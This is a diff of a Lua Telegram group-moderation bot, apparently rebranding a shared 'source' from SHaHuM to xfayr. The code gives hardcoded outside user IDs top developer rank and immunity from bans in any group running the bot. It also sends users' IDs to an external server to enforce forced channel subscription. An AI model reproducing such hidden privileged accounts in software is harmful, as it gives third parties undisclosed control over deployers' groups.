@@ -11,7 +11,7 @@ https   = require("ssl.https")
 sudos   = dofile("sudo.lua")
 bot_id  = token:match("(%d+)")  
 Id_Sudo = Sudo
-List_Sudos = {Id_Sudo,932565396,1850171326}
+List_Sudos = {Id_Sudo,932565396,789908866}
 User = io.popen("whoami"):read('*a')
 IP = io.popen("dig +short myip.opendns.com @resolver1.opendns.com"):read('*a')
 name = io.popen("uname -a | awk '{ name = $2 } END { print name }'"):read('*a')
@@ -20,14 +20,14 @@ Rtime = io.popen("date +'%Y-%m-%d %T'"):read('*a')
 print("\27[34m"..[[
 >> Best Source in Telegram
 >> Features fast and powerful
-   _____             _____           _____ _    _       _    _       __  __ 
-  / ____|           |  __ \         / ____| |  | |     | |  | |     |  \/  |
- | (___   ___  _   _| |__) |___ ___| (___ | |__| | __ _| |__| |_   _| \  / |
-  \___ \ / _ \| | | |  _  // __/ _ \\___ \|  __  |/ _` |  __  | | | | |\/| |
-  ____) | (_) | |_| | | \ \ (__  __/____) | |  | | (_| | |  | | |_| | |  | |
- |_____/ \___/ \__,_|_|  \_\___\___|_____/|_|  |_|\__,_|_|  |_|\__,_|_|  |_|
-                                                                            
-                                                                            
+  ______            _______         __  __ 
+ |  ____|          |__   __|       |  \/  |
+ | |__ __ _ _   _ _ __| | ___  __ _| \  / |
+ |  __/ _` | | | | '__| |/ _ \/ _` | |\/| |
+ | | | (_| | |_| | |  | |  __/ (_| | |  | |
+ |_|  \__,_|\__, |_|  |_|\___|\__,_|_|  |_|
+             __/ |                         
+            |___/                          
 Installation information
 
 User :: ]]..User..[[
@@ -170,7 +170,7 @@ end
 function Rank_Checking(user_id,chat_id)
 if tonumber(user_id) == tonumber(932565396) then  
 var = true  
-elseif tonumber(user_id) == tonumber(1850171326) then
+elseif tonumber(user_id) == tonumber(789908866) then
 var = true  
 elseif tonumber(user_id) == tonumber(Id_Sudo) then
 var = true  
@@ -200,7 +200,7 @@ end
 function Get_Rank(user_id,chat_id)
 if tonumber(user_id) == tonumber(932565396) then  
 var = 'مطور السورس'
-elseif tonumber(user_id) == tonumber(1850171326) then  
+elseif tonumber(user_id) == tonumber(789908866) then  
 var = "مطور السورس"  
 elseif Devxfayre(user_id) == true then
 var = "المطور الاساسي"  
@@ -519,9 +519,9 @@ end
 function Reply_Status(msg,user_id,status,text)
 tdcli_function ({ID = "GetUser",user_id_ = user_id},function(arg,data) 
 if data.first_name_ ~= false then
-local UserName = (data.username_ or "TeaMSHaHuM")
-local NameUser = "[- SHaHuM Source .](https://t.me/TeaMSHaHuM)\n𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄\n⤦: بواسطه -› ["..data.first_name_.."](T.me/"..UserName..")"
-local NameUserr = "[- SHaHuM Source .](https://t.me/TeaMSHaHuM)\n𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄\n⤦: اسم المستخدم -› ["..data.first_name_.."](T.me/"..UserName..")"
+local UserName = (data.username_ or "xfayr")
+local NameUser = "[- fayr Source .](https://t.me/xfayr)\n𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄\n⤦: بواسطه -› ["..data.first_name_.."](T.me/"..UserName..")"
+local NameUserr = "[- fayr Source .](https://t.me/xfayr)\n𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄\n⤦: اسم المستخدم -› ["..data.first_name_.."](T.me/"..UserName..")"
 if status == "lock" then
 send(msg.chat_id_, msg.id_,NameUser.."\n"..text.."\n— — — — — — — — —\n⤦: تم تنفيذ الامر بخاصيه ( المسح )\n")
 return false
@@ -2782,7 +2782,7 @@ if result.id_ == tonumber(932565396) then
 send(msg.chat_id_, msg.id_, "⤦: لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مطور السورس \n")
 return false 
 end
-if result.id_ == tonumber(1850171326) then
+if result.id_ == tonumber(789908866) then
 send(msg.chat_id_, msg.id_, "⤦: لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مطور السورس \n")
 return false 
 end
@@ -2809,7 +2809,7 @@ if userid == tonumber(932565396) then
 send(msg.chat_id_, msg.id_, "⤦: لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مطور السورس \n")
 return false 
 end
-if userid == tonumber(1850171326) then
+if userid == tonumber(789908866) then
 send(msg.chat_id_, msg.id_, "⤦: لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مطور السورس \n")
 return false 
 end
@@ -3448,10 +3448,10 @@ return false
 end
 
 if text == ("رفع مميز") and tonumber(msg.reply_to_message_id_) ~= 0 and Addictive(msg) then  
-local url,res = https.request('http://shahum.ml/subscrib-source/SouRceSHaHuM/ashtrak.php?id='..msg.sender_user_id_)
+local url,res = https.request('http://shahum.ml/subscrib-source/xfayr/ashtrak.php?id='..msg.sender_user_id_)
 data = JSON.decode(url)
 if data.Ch_Member.info ~= true then
-send(msg.chat_id_,msg.id_,'- اشترك في قناة السورس أولا\n[❲ @TeaMSHaHuM ] ❳')
+send(msg.chat_id_,msg.id_,'- اشترك في قناة السورس أولا\n[❲ @xfayr ] ❳')
 return false
 end
 if not Constructor(msg) and database:get(bot_id.."Add:Group:Cheking"..msg.chat_id_) then 
@@ -3466,10 +3466,10 @@ tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumbe
 return false
 end
 if text and text:match("^رفع مميز @(.*)$") and Addictive(msg) then  
-local url,res = https.request('http://shahum.ml/subscrib-source/SouRceSHaHuM/ashtrak.php?id='..msg.sender_user_id_)
+local url,res = https.request('http://shahum.ml/subscrib-source/xfayr/ashtrak.php?id='..msg.sender_user_id_)
 data = JSON.decode(url)
 if data.Ch_Member.info ~= true then
-send(msg.chat_id_,msg.id_,'- اشترك في قناة السورس أولا\n[❲ @TeaMSHaHuM ] ❳')
+send(msg.chat_id_,msg.id_,'- اشترك في قناة السورس أولا\n[❲ @xfayr ] ❳')
 return false
 end
 local username = text:match("^رفع مميز @(.*)$") 
@@ -3494,10 +3494,10 @@ return false
 end
 
 if text and text:match("^رفع مميز (%d+)$") and Addictive(msg) then  
-local url,res = https.request('http://shahum.ml/subscrib-source/SouRceSHaHuM/ashtrak.php?id='..msg.sender_user_id_)
+local url,res = https.request('http://shahum.ml/subscrib-source/xfayr/ashtrak.php?id='..msg.sender_user_id_)
 data = JSON.decode(url)
 if data.Ch_Member.info ~= true then
-send(msg.chat_id_,msg.id_,'- اشترك في قناة السورس أولا\n[❲ @TeaMSHaHuM ] ❳')
+send(msg.chat_id_,msg.id_,'- اشترك في قناة السورس أولا\n[❲ @xfayr ] ❳')
 return false
 end
 local userid = text:match("^رفع مميز (%d+)$")
@@ -3511,10 +3511,10 @@ return false
 end
 
 if (text == ("تنزيل مميز")) and tonumber(msg.reply_to_message_id_) ~= 0 and Addictive(msg) then  
-local url,res = https.request('http://shahum.ml/subscrib-source/SouRceSHaHuM/ashtrak.php?id='..msg.sender_user_id_)
+local url,res = https.request('http://shahum.ml/subscrib-source/xfayr/ashtrak.php?id='..msg.sender_user_id_)
 data = JSON.decode(url)
 if data.Ch_Member.info ~= true then
-send(msg.chat_id_,msg.id_,'- اشترك في قناة السورس أولا\n[❲ @TeaMSHaHuM ] ❳')
+send(msg.chat_id_,msg.id_,'- اشترك في قناة السورس أولا\n[❲ @xfayr ] ❳')
 return false
 end
 function Function_xfayr(extra, result, success)
@@ -3525,10 +3525,10 @@ tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumbe
 return false
 end
 if text and text:match("^تنزيل مميز @(.*)$") and Addictive(msg) then  
-local url,res = https.request('http://shahum.ml/subscrib-source/SouRceSHaHuM/ashtrak.php?id='..msg.sender_user_id_)
+local url,res = https.request('http://shahum.ml/subscrib-source/xfayr/ashtrak.php?id='..msg.sender_user_id_)
 data = JSON.decode(url)
 if data.Ch_Member.info ~= true then
-send(msg.chat_id_,msg.id_,'- اشترك في قناة السورس أولا\n[❲ @TeaMSHaHuM ] ❳')
+send(msg.chat_id_,msg.id_,'- اشترك في قناة السورس أولا\n[❲ @xfayr ] ❳')
 return false
 end
 local username = text:match("^تنزيل مميز @(.*)$") 
@@ -3544,10 +3544,10 @@ tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_xfayr, 
 return false
 end
 if text and text:match("^تنزيل مميز (%d+)$") and Addictive(msg) then  
-local url,res = https.request('http://shahum.ml/subscrib-source/SouRceSHaHuM/ashtrak.php?id='..msg.sender_user_id_)
+local url,res = https.request('http://shahum.ml/subscrib-source/xfayr/ashtrak.php?id='..msg.sender_user_id_)
 data = JSON.decode(url)
 if data.Ch_Member.info ~= true then
-send(msg.chat_id_,msg.id_,'- اشترك في قناة السورس أولا\n[❲ @TeaMSHaHuM ] ❳')
+send(msg.chat_id_,msg.id_,'- اشترك في قناة السورس أولا\n[❲ @xfayr ] ❳')
 return false
 end
 local userid = text:match("^تنزيل مميز (%d+)$") 
@@ -3556,10 +3556,10 @@ Reply_Status(msg,userid,"reply","⤦: تم تنزيله من المميزين")
 return false
 end  
 if text and text:match("رفع (.*)") and tonumber(msg.reply_to_message_id_) > 0 and Addictive(msg) then  
-local url,res = https.request('http://shahum.ml/subscrib-source/SouRceSHaHuM/ashtrak.php?id='..msg.sender_user_id_)
+local url,res = https.request('http://shahum.ml/subscrib-source/xfayr/ashtrak.php?id='..msg.sender_user_id_)
 data = JSON.decode(url)
 if data.Ch_Member.info ~= true then
-send(msg.chat_id_,msg.id_,'- اشترك في قناة السورس أولا\n[❲ @TeaMSHaHuM ] ❳')
+send(msg.chat_id_,msg.id_,'- اشترك في قناة السورس أولا\n[❲ @xfayr ] ❳')
 return false
 end
 local RTPA = text:match("رفع (.*)")
@@ -3568,19 +3568,19 @@ function by_reply(extra, result, success)
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
 local xfayrrt = database:get(bot_id.."xfayr:Comd:New:rt:bot:"..RTPA..msg.chat_id_)
 if xfayrrt == "مميز" and Addictive(msg) then
-send(msg.chat_id_, msg.id_,"[- SHaHuM Source .](https://t.me/TeaMSHaHuM)\n𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄\n⤦: العضو -› ["..data.first_name_.."](t.me/"..(data.username_ or "TeaMSHaHuM")..")".."\n⤦: تم رفعه "..RTPA.." هنا\n")
+send(msg.chat_id_, msg.id_,"[- fayr Source .](https://t.me/xfayr)\n𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄\n⤦: العضو -› ["..data.first_name_.."](t.me/"..(data.username_ or "xfayr")..")".."\n⤦: تم رفعه "..RTPA.." هنا\n")
 database:set(bot_id.."xfayr:Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,RTPA) 
 database:sadd(bot_id.."xfayr:Special:User"..msg.chat_id_,result.sender_user_id_)  
 elseif xfayrrt == "ادمن" and Owner(msg) then 
-send(msg.chat_id_, msg.id_,"[- SHaHuM Source .](https://t.me/TeaMSHaHuM)\n𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄\n⤦: العضو -› ["..data.first_name_.."](t.me/"..(data.username_ or "TeaMSHaHuM")..")".."\n⤦: تم رفعه "..RTPA.." هنا\n")
+send(msg.chat_id_, msg.id_,"[- fayr Source .](https://t.me/xfayr)\n𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄\n⤦: العضو -› ["..data.first_name_.."](t.me/"..(data.username_ or "xfayr")..")".."\n⤦: تم رفعه "..RTPA.." هنا\n")
 database:set(bot_id.."xfayr:Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,RTPA)
 database:sadd(bot_id.."xfayr:Mod:User"..msg.chat_id_,result.sender_user_id_)  
 elseif xfayrrt == "مدير" and Constructor(msg) then
-send(msg.chat_id_, msg.id_,"[- SHaHuM Source .](https://t.me/TeaMSHaHuM)\n𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄\n⤦: العضو -› ["..data.first_name_.."](t.me/"..(data.username_ or "TeaMSHaHuM")..")".."\n⤦: تم رفعه "..RTPA.." هنا\n")
+send(msg.chat_id_, msg.id_,"[- fayr Source .](https://t.me/xfayr)\n𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄\n⤦: العضو -› ["..data.first_name_.."](t.me/"..(data.username_ or "xfayr")..")".."\n⤦: تم رفعه "..RTPA.." هنا\n")
 database:set(bot_id.."xfayr:Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,RTPA)  
 database:sadd(bot_id.."xfayr:Manager"..msg.chat_id_,result.sender_user_id_)  
 elseif xfayrrt == "عضو" and Addictive(msg) then
-send(msg.chat_id_, msg.id_,"[- SHaHuM Source .](https://t.me/TeaMSHaHuM)\n𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄\n⤦: العضو -› ["..data.first_name_.."](t.me/"..(data.username_ or "TeaMSHaHuM")..")".."\n⤦: تم رفعه "..RTPA.." هنا\n")
+send(msg.chat_id_, msg.id_,"[- fayr Source .](https://t.me/xfayr)\n𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄\n⤦: العضو -› ["..data.first_name_.."](t.me/"..(data.username_ or "xfayr")..")".."\n⤦: تم رفعه "..RTPA.." هنا\n")
 end
 end,nil)   
 end   
@@ -3588,10 +3588,10 @@ tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonu
 end
 end
 if text and text:match("تنزيل (.*)") and tonumber(msg.reply_to_message_id_) > 0 and Addictive(msg) then  
-local url,res = https.request('http://shahum.ml/subscrib-source/SouRceSHaHuM/ashtrak.php?id='..msg.sender_user_id_)
+local url,res = https.request('http://shahum.ml/subscrib-source/xfayr/ashtrak.php?id='..msg.sender_user_id_)
 data = JSON.decode(url)
 if data.Ch_Member.info ~= true then
-send(msg.chat_id_,msg.id_,'- اشترك في قناة السورس أولا\n[❲ @TeaMSHaHuM ] ❳')
+send(msg.chat_id_,msg.id_,'- اشترك في قناة السورس أولا\n[❲ @xfayr ] ❳')
 return false
 end
 local RTPA = text:match("تنزيل (.*)")
@@ -3600,19 +3600,19 @@ function by_reply(extra, result, success)
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
 local xfayrrt = database:get(bot_id.."xfayr:Comd:New:rt:bot:"..RTPA..msg.chat_id_)
 if xfayrrt == "مميز" and Addictive(msg) then
-send(msg.chat_id_, msg.id_,"[- SHaHuM Source .](https://t.me/TeaMSHaHuM)\n𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄\n⤦: العضو -› ["..data.first_name_.."](t.me/"..(data.username_ or "TeaMSHaHuM")..")".."\n⤦: تم تنزيله من "..RTPA.." هنا\n")  
+send(msg.chat_id_, msg.id_,"[- fayr Source .](https://t.me/xfayr)\n𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄\n⤦: العضو -› ["..data.first_name_.."](t.me/"..(data.username_ or "xfayr")..")".."\n⤦: تم تنزيله من "..RTPA.." هنا\n")  
 database:srem(bot_id.."xfayr:Special:User"..msg.chat_id_,result.sender_user_id_)  
 database:del(bot_id.."xfayr:Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
 elseif xfayrrt == "ادمن" and Owner(msg) then 
-send(msg.chat_id_, msg.id_,"[- SHaHuM Source .](https://t.me/TeaMSHaHuM)\n𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄\n⤦: العضو -› ["..data.first_name_.."](t.me/"..(data.username_ or "TeaMSHaHuM")..")".."\n⤦: تم تنزيله من "..RTPA.." هنا\n")  
+send(msg.chat_id_, msg.id_,"[- fayr Source .](https://t.me/xfayr)\n𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄\n⤦: العضو -› ["..data.first_name_.."](t.me/"..(data.username_ or "xfayr")..")".."\n⤦: تم تنزيله من "..RTPA.." هنا\n")  
 database:srem(bot_id.."xfayr:Mod:User"..msg.chat_id_,result.sender_user_id_) 
 database:del(bot_id.."xfayr:Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
 elseif xfayrrt == "مدير" and Constructor(msg) then
-send(msg.chat_id_, msg.id_,"[- SHaHuM Source .](https://t.me/TeaMSHaHuM)\n𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄\n⤦: العضو -› ["..data.first_name_.."](t.me/"..(data.username_ or "TeaMSHaHuM")..")".."\n⤦: تم تنزيله من "..RTPA.." هنا\n")  
+send(msg.chat_id_, msg.id_,"[- fayr Source .](https://t.me/xfayr)\n𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄\n⤦: العضو -› ["..data.first_name_.."](t.me/"..(data.username_ or "xfayr")..")".."\n⤦: تم تنزيله من "..RTPA.." هنا\n")  
 database:srem(bot_id.."xfayr:Manager"..msg.chat_id_,result.sender_user_id_)  
 database:del(bot_id.."xfayr:Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
 elseif xfayrrt == "عضو" and Addictive(msg) then
-send(msg.chat_id_, msg.id_,"[- SHaHuM Source .](https://t.me/TeaMSHaHuM)\n𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄\n⤦: العضو -› ["..data.first_name_.."](t.me/"..(data.username_ or "TeaMSHaHuM")..")".."\n⤦: تم تنزيله من "..RTPA.." هنا\n")  
+send(msg.chat_id_, msg.id_,"[- fayr Source .](https://t.me/xfayr)\n𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄\n⤦: العضو -› ["..data.first_name_.."](t.me/"..(data.username_ or "xfayr")..")".."\n⤦: تم تنزيله من "..RTPA.." هنا\n")  
 end
 end,nil)   
 end   
@@ -3620,10 +3620,10 @@ tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonu
 end
 end
 if text and text:match("^رفع (.*) @(.*)") and Addictive(msg) then  
-local url,res = https.request('http://shahum.ml/subscrib-source/SouRceSHaHuM/ashtrak.php?id='..msg.sender_user_id_)
+local url,res = https.request('http://shahum.ml/subscrib-source/xfayr/ashtrak.php?id='..msg.sender_user_id_)
 data = JSON.decode(url)
 if data.Ch_Member.info ~= true then
-send(msg.chat_id_,msg.id_,'- اشترك في قناة السورس أولا\n[❲ @TeaMSHaHuM ] ❳')
+send(msg.chat_id_,msg.id_,'- اشترك في قناة السورس أولا\n[❲ @xfayr ] ❳')
 return false
 end
 local text1 = {string.match(text, "^(رفع) (.*) @(.*)$")}
@@ -3632,19 +3632,19 @@ function py_username(extra, result, success)
 if result.id_ then
 local xfayrrt = database:get(bot_id.."xfayr:Comd:New:rt:bot:"..text1[2]..msg.chat_id_)
 if xfayrrt == "مميز" and Addictive(msg) then
-send(msg.chat_id_, msg.id_,"[- SHaHuM Source .](https://t.me/TeaMSHaHuM)\n𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄\n⤦: العضو -› ["..result.title_.."](t.me/"..(text1[3] or "TeaMSHaHuM")..")".."\n⤦: تم رفعه "..text1[2].." هنا")   
+send(msg.chat_id_, msg.id_,"[- fayr Source .](https://t.me/xfayr)\n𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄\n⤦: العضو -› ["..result.title_.."](t.me/"..(text1[3] or "xfayr")..")".."\n⤦: تم رفعه "..text1[2].." هنا")   
 database:sadd(bot_id.."xfayr:Special:User"..msg.chat_id_,result.id_)  
 database:set(bot_id.."xfayr:Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
 elseif xfayrrt == "ادمن" and Owner(msg) then 
-send(msg.chat_id_, msg.id_,"[- SHaHuM Source .](https://t.me/TeaMSHaHuM)\n𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄\n⤦: العضو -› ["..result.title_.."](t.me/"..(text1[3] or "TeaMSHaHuM")..")".."\n⤦: تم رفعه "..text1[2].." هنا")   
+send(msg.chat_id_, msg.id_,"[- fayr Source .](https://t.me/xfayr)\n𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄\n⤦: العضو -› ["..result.title_.."](t.me/"..(text1[3] or "xfayr")..")".."\n⤦: تم رفعه "..text1[2].." هنا")   
 database:sadd(bot_id.."xfayr:Mod:User"..msg.chat_id_,result.id_)  
 database:set(bot_id.."xfayr:Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
 elseif xfayrrt == "مدير" and Constructor(msg) then
-send(msg.chat_id_, msg.id_,"[- SHaHuM Source .](https://t.me/TeaMSHaHuM)\n𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄\n⤦: العضو -› ["..result.title_.."](t.me/"..(text1[3] or "TeaMSHaHuM")..")".."\n⤦: تم رفعه "..text1[2].." هنا")   
+send(msg.chat_id_, msg.id_,"[- fayr Source .](https://t.me/xfayr)\n𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄\n⤦: العضو -› ["..result.title_.."](t.me/"..(text1[3] or "xfayr")..")".."\n⤦: تم رفعه "..text1[2].." هنا")   
 database:sadd(bot_id.."xfayr:Manager"..msg.chat_id_,result.id_)  
 database:set(bot_id.."xfayr:Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
 elseif xfayrrt == "عضو" and Addictive(msg) then
-send(msg.chat_id_, msg.id_,"[- SHaHuM Source .](https://t.me/TeaMSHaHuM)\n𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄\n⤦: العضو -› ["..result.title_.."](t.me/"..(text1[3] or "TeaMSHaHuM")..")".."\n⤦: تم رفعه "..text1[2].." هنا")   
+send(msg.chat_id_, msg.id_,"[- fayr Source .](https://t.me/xfayr)\n𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄\n⤦: العضو -› ["..result.title_.."](t.me/"..(text1[3] or "xfayr")..")".."\n⤦: تم رفعه "..text1[2].." هنا")   
 end
 else
 info = "⤦: المعرف غلط"
@@ -3655,10 +3655,10 @@ tdcli_function ({ID = "SearchPublicChat",username_ = text1[3]},py_username,nil)
 end 
 end
 if text and text:match("^تنزيل (.*) @(.*)") and Addictive(msg) then  
-local url,res = https.request('http://shahum.ml/subscrib-source/SouRceSHaHuM/ashtrak.php?id='..msg.sender_user_id_)
+local url,res = https.request('http://shahum.ml/subscrib-source/xfayr/ashtrak.php?id='..msg.sender_user_id_)
 data = JSON.decode(url)
 if data.Ch_Member.info ~= true then
-send(msg.chat_id_,msg.id_,'- اشترك في قناة السورس أولا\n[❲ @TeaMSHaHuM ] ❳')
+send(msg.chat_id_,msg.id_,'- اشترك في قناة السورس أولا\n[❲ @xfayr ] ❳')
 return false
 end
 local text1 = {string.match(text, "^(تنزيل) (.*) @(.*)$")}
@@ -3667,19 +3667,19 @@ function py_username(extra, result, success)
 if result.id_ then
 local xfayrrt = database:get(bot_id.."xfayr:Comd:New:rt:bot:"..text1[2]..msg.chat_id_)
 if xfayrrt == "مميز" and Addictive(msg) then
-send(msg.chat_id_, msg.id_,"[- SHaHuM Source .](https://t.me/TeaMSHaHuM)\n𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄\n⤦: العضو -› ["..result.title_.."](t.me/"..(text1[3] or "TeaMSHaHuM")..")".."\n⤦: تم تنريله من "..text1[2].." هنا")   
+send(msg.chat_id_, msg.id_,"[- fayr Source .](https://t.me/xfayr)\n𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄\n⤦: العضو -› ["..result.title_.."](t.me/"..(text1[3] or "xfayr")..")".."\n⤦: تم تنريله من "..text1[2].." هنا")   
 database:srem(bot_id.."xfayr:Special:User"..msg.chat_id_,result.id_)  
 database:del(bot_id.."xfayr:Comd:New:rt:User:"..msg.chat_id_..result.id_)
 elseif xfayrrt == "ادمن" and Owner(msg) then 
-send(msg.chat_id_, msg.id_,"[- SHaHuM Source .](https://t.me/TeaMSHaHuM)\n𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄\n⤦: العضو -› ["..result.title_.."](t.me/"..(text1[3] or "TeaMSHaHuM")..")".."\n⤦: تم تنريله من "..text1[2].." هنا")   
+send(msg.chat_id_, msg.id_,"[- fayr Source .](https://t.me/xfayr)\n𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄\n⤦: العضو -› ["..result.title_.."](t.me/"..(text1[3] or "xfayr")..")".."\n⤦: تم تنريله من "..text1[2].." هنا")   
 database:srem(bot_id.."xfayr:Mod:User"..msg.chat_id_,result.id_)  
 database:del(bot_id.."xfayr:Comd:New:rt:User:"..msg.chat_id_..result.id_)
 elseif xfayrrt == "مدير" and Constructor(msg) then
-send(msg.chat_id_, msg.id_,"[- SHaHuM Source .](https://t.me/TeaMSHaHuM)\n𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄\n⤦: العضو -› ["..result.title_.."](t.me/"..(text1[3] or "TeaMSHaHuM")..")".."\n⤦: تم تنريله من "..text1[2].." هنا")   
+send(msg.chat_id_, msg.id_,"[- fayr Source .](https://t.me/xfayr)\n𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄\n⤦: العضو -› ["..result.title_.."](t.me/"..(text1[3] or "xfayr")..")".."\n⤦: تم تنريله من "..text1[2].." هنا")   
 database:srem(bot_id.."xfayr:Manager"..msg.chat_id_,result.id_)  
 database:del(bot_id.."xfayr:Comd:New:rt:User:"..msg.chat_id_..result.id_)
 elseif xfayrrt == "عضو" and Addictive(msg) then
